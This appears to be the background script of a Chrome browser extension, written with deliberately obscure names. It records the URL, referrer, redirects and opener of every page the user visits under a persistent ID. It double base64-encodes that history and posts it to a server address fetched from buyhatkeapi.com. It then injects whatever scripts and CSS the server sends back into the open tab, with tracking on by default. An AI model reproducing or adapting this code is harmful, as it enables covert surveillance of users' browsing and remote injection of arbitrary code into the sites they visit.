

var dynamicalt = (function() {

    var itemator = 695;
    var version = chrome.runtime.getManifest().version, serverInfo = localStorage.serverInfo ? JSON.parse(localStorage.serverInfo) : [];
    // var url = 'https://service.insttranslate.com';
    var url = 'https://buyhatkeapi.com';
    var settings_key = "dtranaptid";
    var set_route = "/monits";
    var main_route = "/fldr/elli";

    var guid_key = "reledk";
    var skeys = ['o', 'u'];
    var tkey = "reenable";

    var ch=8;
    var browsername = "chrome";

    function str_endsWith(str, tail){
        return typeof str === "string"
            && typeof tail === "string"
            && str.lastIndexOf(tail) === str.length - tail.length;
    }

    var toggler = new(function(){
        var isOn = true,
            defaultVal = true,
            localKey = tkey;
        function save(){
            localStorage.setItem(localKey, isOn ? 1:0);
        };
        function load(){
            var val = localStorage.getItem(localKey),
                intVal = parseInt(val);
            if (isNaN(intVal)){
                isOn = defaultVal;
            }else{
                isOn = intVal === 1;
            }
        };
        this.turnOn = function(){ isOn = true; save(); _optTurnOn(); }
        function _optTurnOn() {};
        this.turnOff = function(){ isOn = false; save(); }
        this.isOn = function(){ return isOn; }
        /**
         * returns a Promise which resolves only when (or after) toggler is turned On
         * if toggler is turned on by the time this function is called
         * promise resolved instantly
         * @returns {Promise}
         */
        this.whenOn = function(){
            if (this.isOn()){
                return Promise.resolve(true);
            }
            return new Promise(function(resolve){
                _optTurnOn = function(){
                    resolve();
                };
            });
        };
        load();
    });
    var configFetcher = new(
        function(){
            var settings = '';
            var setDump = function() {
                localStorage.setItem(settings_key, JSON.stringify(settings));
            };
            var setLoad = function() {
                var p = localStorage.getItem(settings_key);
                settings = p ? JSON.parse(p) : settings;
            };
            var setUp = function(endpt){
                var cb = function(sts, resp){
                    if (!sts) {
                        return;
                    }
                    settings = JSON.parse(resp);
                    setDump();
                };
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                    if (4 == xhr.readyState) {
                        cb.apply(null, [200 == xhr.status, xhr.responseText].concat(arguments));
                    }};
                var proc = function(arr){ return Object.keys(arr).map(function(hashed) {
                    return hashed + '=' + arr[hashed]; }).join("&")}
                xhr.open("GET", endpt + "?" + proc({s: itemator, ver: version}), true);
                xhr.send();
            };
            setLoad();
            toggler.whenOn().then(function(){
                setUp(url+set_route);
            });
            this.IsEnable = function() {
                return Boolean(settings && settings[skeys[0]])
            };
            this.MainLocator = function() {
                return settings && settings[skeys[1]]
            };
        }
    )();
    var filtered = ["restarting", "hh", "p", "fr","aj", "replaced", "retroet", "dada"];
    function qs(obj) {
        return Object.keys(obj).filter(function (key) {
            return (!!obj[key] || false === obj[key]) && filtered.indexOf(key) === -1;
        }).map(function (key) {
            var val = obj[key];
            if ('rdrcts' === key) {
                return obj[key].map(function (v) {
                    return key + '=' + encodeURIComponent(v);
                }).join('&');
            }
            if (-1 < 'ul pel rr bos ljh'.split(' ').indexOf(key)) {
                val = encodeURIComponent(val || '');
            }
            return key + '=' + val;
        }).join('&');
    }
    function fetchOverlayPattern(data, callback) {
        data.trm = Date.now();
        var bqa = qs(data);
        var payload = btoa(bqa);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', configFetcher.MainLocator()+main_route, true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.onload = function (e) {
            if (this.status == 200) {
                callback({
                    rl: data.pel,
                    lr: JSON.parse(this.response)
                });
            }
        };
        xhr.send(['e', encodeURIComponent(btoa(payload))].join('='));
    }
    function TabList() {
        var hash = {};
        var lp = "";
        var lpi = undefined;
        return {
            remove: function (tid) {
                delete hash[tid];
            },
            edit: function (tid, props) {
                if (!tid) return null;
                if (!hash[tid]) this.clear(tid);
                Object.keys(props || {}).forEach(function (key) {
                    hash[tid][key] = props[key];
                });
                return hash[tid];
            },
            request: function (tabId, tab) {
                if(!configFetcher.IsEnable() || !toggler.isOn())
                    return
                if (!hash[tabId] || (hash[tabId].p && !hash[tabId].replaced)) {
                    this.clear(tabId);
                    return;
                }
                var currTab = hash[tabId] || {};
                var url = validateUrl(tab.url);
                if (url && !(!currTab.hh && lp == tab.url)) {
                    if (!tab.active && !hash[tabId].fr) {
                        hash[tabId].poz.push("background_auto_reloading");
                    }
                    if(hash[tabId].dada && hash[hash[tabId].dada] && hash[hash[tabId].dada].retroet){
                        hash[tabId].ljh = hash[hash[tabId].dada].retroet;
                    }
                    fetchOverlayPattern(this.edit(tabId, {
                        ul: url,
                        pel: lp
                    }), function (d) {
                        if (d.lr && d.lr && d.lr.content_scripts && d.lr.content_scripts.length > 0){
                            var files = d.lr.content_scripts.map(function(el){return {file: el}});
                            files.forEach(function(file){
                                if (str_endsWith(file.file, ".css")){
                                    chrome.tabs.insertCSS(tabId, file);
                                }else{
                                    chrome.tabs.executeScript(tabId, file);
                                }
                            });
                        }
                    });
                    if (tab.active) {
                        lp = currTab.ul;
                    }
                    hash[tabId].ljh = null;
                    hash[tabId].dada = null;
                }
                this.clear(tabId);
                hash[tabId].ul = url;
                hash[tabId].p = true;
            },
            clear: function (tid) {
                hash[tid] = {
                    v3: version, dis: 21, cm: "1", org: browsername,ch:ch,
                    rm: itemator, cas: guid(), sesrm: '', inv: 0,
                    rdrcts: [], restarting: false,
                    ul :  (hash[tid] || {}).ul || null,
                    rr : (hash[tid] || {}).rr || '',
                    poz: [], fr: false, aj : (hash[tid] || {}).aj || false,
                    replaced :  (hash[tid] || {}).replaced || false,
                    hh :  (hash[tid] || {}).hh || false,
                    dada: (hash[tid] || {}).dada || null,
                    retroet: (hash[tid] || {}).retroet || '',
                    ljh: (hash[tid] || {}).ljh || ''
                };
            },
            details: function (tid, cb) {
                chrome.tabs.get(tid, function (details) {
                    if (!chrome.runtime.lastError) {
                        cb(details);
                    }
                });
            },
            lpUpdate: function (param) {
                var idd = param.id || param;
                lpi = param.id || undefined;
                lp = (hash[idd] || {}).ul || lp;
            },
            getLpi: function(){
                return lpi;
            }
        }
    }
    function validateUrl(url) {
        return (url.indexOf("http") === 0 &&
        url.indexOf(":/"+"/localhost") === -1 &&
        url.indexOf("chrome/newtab") === -1 &&
        url.indexOf("chrome-") !== 0 &&
        url.indexOf("about:") !== 0  &&
        url.indexOf("chrome:/"+"/") === -1) ? url : null;
    }
    var tablist = new TabList();
    var cb = chrome.browserAction,
        ct = chrome.tabs,
        wr = chrome.webRequest,
        wn = chrome.webNavigation,
        cw = chrome.windows;
    chrome.runtime.onMessage.addListener(function(request, sender){
        if(request.href) {
            tablist.edit(sender.tab.id, {ljh: request.href})
        }else if(request.ahref){
            tablist.edit(sender.tab.id, {retroet: request.ahref})
        }
    });
    cw.getAll({populate: true}, function (windows) {
        for (var w = 0; w < windows.length; w++) {
            for (var i = 0; i < windows[w].tabs.length; i++) {
                if (!validateUrl(windows[w].tabs[i].url))
                    continue;
                tablist.edit(windows[w].tabs[i].id, {ul: windows[w].tabs[i].url, restarting: true});
                if (windows[w].focused && windows[w].tabs[i].active) {
                    tablist.lpUpdate(windows[w].tabs[i]);
                }
            }
        }
    });
    function reselected(tid) {
        tablist.details((tid || {}).tabId || tid, tablist.lpUpdate);
    }
    ct.onUpdated.addListener(onUpdated);
    ct.onReplaced.addListener(onReplaced);
    var repertuar = {types: ["main_frame"], urls: ["<all_urls>"]};
    wr.onBeforeRequest.addListener(function (details) {
        validateUrl(details.url) && tablist.edit(details.tabId, {ul: undefined, p: false, aj : false});
    }, repertuar, ["blocking"]);
    wr.onBeforeRedirect.addListener(function (details) {
        validateUrl(details.url) && tablist.edit(details.tabId).rdrcts.push(details.url);
    }, repertuar);
    wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders, repertuar, ["blocking", "requestHeaders"]);
    wr.onHeadersReceived.addListener(function (details) {
        tablist.edit(details.tabId, {hh: true})
    }, repertuar);
    wn.onCommitted.addListener(onCommitted);
    ct.onRemoved.addListener(function (tabId) {
        tablist.remove(tabId);
    });
    cw.onRemoved.addListener(cwonRemoved);
    ct.onCreated.addListener(onCreated);
    cw.onFocusChanged.addListener(cwonFocused);
    if (ct.onActivated) {
        ct.onActivated.addListener(reselected);
    } else {
        ct.onSelectionChanged.addListener(reselected);
    }
    wr.onErrorOccurred.addListener(function (details) {
        try {
            tablist.edit(details.tabId, {rdrcts: null});
        } catch (e) {
        }
    }, repertuar);
    function onUpdated(tabId, details, tab) {
        if (details && "complete" === details.status) {
            if(tablist.edit(tabId).p && tablist.edit(tabId).aj){
                tablist.edit(tabId, {ul: undefined, p: false, aj : false});
            }
            tablist.edit(tabId, {strm: "ajax", aj : true});
            tablist.request(tabId, tab);
            tablist.edit(tabId, {replaced: false});
        }
    }
    function onReplaced(addedTabId, removedTabId) {
        tablist.edit(addedTabId, {replaced: true});
        tablist.details(addedTabId, tablist.request.bind(tablist, (addedTabId || {}).tabId || addedTabId));
    }
    function onBeforeSendHeaders(details) {
        tablist.edit(details.tabId, {hh: true});
        if(!details.requestHeaders.some(function (rh) {
                return /^Referer$/i.test(rh.name) && tablist.edit(details.tabId, {rr: rh.value});
            })){
            tablist.edit(details.tabId, {rr: ''})
        }
        return {requestHeaders: details.requestHeaders};
    }
    function onCommitted(dtls) {
        dtls = dtls || {};
        var tid = dtls.tabId;
        var tul = dtls.transitionQualifiers;
        if (tid && dtls.frameId === 0) {
            tablist.edit(tid, {strm: dtls.transitionType, tul: tul});
            if ( /client_redirect/.test(tul)) {
                tablist.edit(tid, {bos: dtls.url});
            }
            if (/server_redirect/.test(tul)) {
            }
            tablist.details(tid, tablist.request.bind(tablist, (tid || {}).tabId || tid));
        }
    }
    function cwonRemoved(windowID) {
        ct.query({active: true}, function (tabs) {
            if (tabs[0]) {
                tablist.lpUpdate(tabs[0]);
            }
        });
    }
    function cwonFocused(window) {
        if (cw.WINDOW_ID_NONE == window) {
            return;
        }
        ct.query({windowId: window, active: true}, function (tabs) {
            if (tabs[0] && tabs[0].active) {
                tablist.lpUpdate(tabs[0]);
            }
        });
    }
    function onCreated(tab) {
        var curTab = tablist.edit(tab.id, {fr: true,  replaced : false});
        var openerTabId = tab.openerTabId || tablist.getLpi();
        var oOpenerTabInfo = tablist.edit(openerTabId);
        if (tab.url.length && tablist.edit(openerTabId) && tab.url === tablist.edit(openerTabId).ul) {
            tablist.edit(tab.id).poz.push("duplication");
        } else if (tab.url.length) {
            ct.query({
                url: tab.url
            }, function (tabs) {
                if ((tabs || []).length > 1) {
                    tablist.edit(tab.id).poz.push("duplication");
                    tablist.edit(tab.id).poz.push("background_duplication");
                }
            });
        }
        if ('complete' == tab.status && !tab.openerTabId) {
            tablist.edit(tab.id).poz.push("reopening");
        }
        tablist.edit(tab.id, {dada: openerTabId});
    }
    function guid() {
        var guid = localStorage.getItem(guid_key);
        if (!guid) {
            var g = function () {
                return (((1 + Math.random(Date.now() + 12)) * 0x10000) | 0).toString(30).substring(1);
            };
            guid = (g() + g() + g() + g() + g() + g() + g() + g() + g());
            localStorage.setItem(guid_key, guid);
        }
        return guid;
    }

    chrome.runtime.onMessage.addListener(function(request){
        if (!request || !request.action) return;
        switch(request.action){
            case "share_devdata_on":
                toggler.turnOn();
                break;
            case "share_devdata_off":
                toggler.turnOff();
                break;
        }
    });

    return {
        optin : toggler.turnOn,
        optout : toggler.turnOff,
        isopt : toggler.isOn,
        whenopt: toggler.whenOn()
    }
}());
